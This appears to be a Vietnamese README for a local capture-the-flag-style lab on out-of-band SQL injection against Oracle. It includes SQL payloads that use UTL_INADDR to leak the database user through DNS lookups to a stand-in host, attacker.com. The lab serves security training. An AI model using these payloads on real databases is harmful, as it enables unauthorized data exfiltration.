# SQLi-039: Oracle OOB DNS via UTL_INADDR

## 🎯 Mục Tiêu

Khai thác Out-of-Band SQL Injection trên Oracle bằng `UTL_INADDR.GET_HOST_ADDRESS` để trigger DNS lookup.

## 📝 Mô Tả

**Scenario:** ACL chỉ cho phép DNS resolution, không cho phép HTTP outbound.

**URL:** `http://localhost:5039/order?id=1`

## 🎓 Kiến Thức Cần Thiết

### UTL_INADDR

Package cho DNS operations:

```sql
-- Trigger DNS lookup
SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.attacker.com') FROM dual

-- Alternative
SELECT UTL_INADDR.GET_HOST_NAME((SELECT user FROM dual)||'.attacker.com') FROM dual
```

## 🚀 Run Lab

```bash
docker-compose up -d
curl http://localhost:5039/order?id=1
```

## 🏁 Flag: `FLAG{...}`
